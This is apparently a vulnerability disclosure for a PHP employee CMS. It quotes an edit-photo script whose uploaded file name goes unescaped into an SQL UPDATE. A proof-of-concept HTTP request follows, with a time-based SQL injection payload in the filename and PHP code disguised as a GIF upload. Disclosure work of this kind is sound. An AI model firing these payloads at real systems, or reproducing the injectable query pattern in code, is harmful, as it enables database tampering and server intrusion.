### Vulnerability file address

`Employee/edit-photo.php` from line 16,The `$location` parameter is controllable and the `$location` is not protected from sql injection, line 18 `$sql = " update tblemployee set photo='$location' where email='$email'";` ,line 20 `mysqli_query($conn, $sql`,line 20 performs a SQL query, causing SQL injection

```php
<?php
include('../inc/topbar.php'); 
if(empty($_SESSION['login_email']))
    {   
      header("Location: ../Account/login.php"); 
    }

if(isset($_POST["btnedit"]))
{


$image= addslashes(file_get_contents($_FILES['userImage']['tmp_name']));
$image_name= addslashes($_FILES['userImage']['name']);
$image_size= getimagesize($_FILES['userImage']['tmp_name']);
move_uploaded_file($_FILES["userImage"]["tmp_name"],"../uploadImage/Profile/" . $_FILES["userImage"]["name"]);			
$location="uploadImage/Profile/" . $_FILES["userImage"]["name"];
			
$sql = " update tblemployee set photo='$location' where email='$email'";
   
   if (mysqli_query($conn, $sql)) {

header("Location: profile.php");
}else{
$_SESSION['error']='Editing Was Not Successful';


}
}
?> 
```

### POC

```http
POST /CMS/php/employee_akpoly/Employee/edit-photo.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------55395399231236061983284304644
Content-Length: 356
Origin: http://10.0.0.20:82
Connection: close
Referer: http://10.0.0.20:82/CMS/php/employee_akpoly/Employee/edit-photo.php
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1

-----------------------------55395399231236061983284304644
Content-Disposition: form-data; name="userImage"; filename="1' WHERE 3060=3060 AND (SELECT 9930 FROM (SELECT(SLEEP(5)))upEx)-- jBbv"
Content-Type: image/png

GIF89a<?php echo 123; ?>

-----------------------------55395399231236061983284304644
Content-Disposition: form-data; name="btnedit"


-----------------------------55395399231236061983284304644--

```

### Attack results pictures

![image-20250128231818311](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501282318353.png)